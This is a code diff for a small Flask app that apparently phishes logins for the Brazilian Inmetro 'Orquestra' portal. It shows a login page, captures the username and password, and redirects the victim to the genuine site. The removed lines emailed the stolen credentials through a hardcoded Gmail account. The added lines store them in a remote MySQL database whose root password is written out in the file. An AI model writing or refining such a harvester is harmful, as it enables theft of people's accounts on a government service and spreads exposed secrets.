@@ -1,59 +1,49 @@
 from flask import Flask, render_template, request, redirect
-from flask_mail import Mail, Message
+import mysql.connector
 
 app = Flask(__name__)
-
-mail = 'inmetro.orquestra@gmail.com'
-pwd = '30452560'
-
-mail_settings = {
-  "MAIL_SERVER": 'smtp.gmail.com',  # Servidor SMTP do seu provedor de email
-  "MAIL_PORT": 465,  # Porta SMTP
-  "MAIL_USE_SSL": True,  # Habilitar SSL
-  "MAIL_USE_TLS": False,  # Habilitar TLS
-  "MAIL_USERNAME": mail,  # Seu endereço de email
-  "MAIL_PASSWORD": pwd  # Sua senha de email
-}
-
-app.config.update(mail_settings)
-mail = Mail(app)
 
 class Dados:
    def __init__(self, login, senha):
       self.login = login
       self.senha = senha
 
-
 @app.route('/')
 def index():
   return render_template('index.html')
 
-
 @app.route('/', methods=['POST'])
 def login():
     if request.method == 'POST':
-      formDados = Dados(
-         request.form['Login'], 
-         request.form['Password']
-        )
-      
+      login = request.form['login']
+      senha = request.form['senha']
 
-      # Enviar um email com os dados de login e senha
-      msg = Message(
-         subject= f'Novo login e senha de {formDados.login}', 
-         sender=mail, 
-         recipients=[mail],
-         body= f'''
+      # Criar um objeto com os dados recebidos
+      dados = Dados(login, senha)
 
-          Login: {formDados.login}
-          Senha: {formDados.senha}
-          
-          '''
+      # Estabelecer a conexão com o banco de dados MySQL
+      conn = mysql.connector.connect(
+        host='containers-us-west-189.railway.app',
+        user='root',
+        password='5Rg4COCO8b9meUM2gTbE',
+        database='railway'
       )
 
-      mail.send(msg)
-      app.logger.info('Login e senha enviados com sucesso!')
-      
+      # Criar um cursor para executar as operações no banco de dados
+      cursor = conn.cursor()
+
+      # Executar a inserção dos dados na tabela desejada
+      query = "INSERT INTO users_2 (login, senha) VALUES (%s, %s)"
+      values = (dados.login, dados.senha)
+      cursor.execute(query, values)
+
+      # Confirmar a transação
+      conn.commit()
+
+      # Fechar o cursor e a conexão com o banco de dados
+      cursor.close()
+      conn.close()
+
       # Redirecionar para um site após a inserção no banco de dados
       return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
 
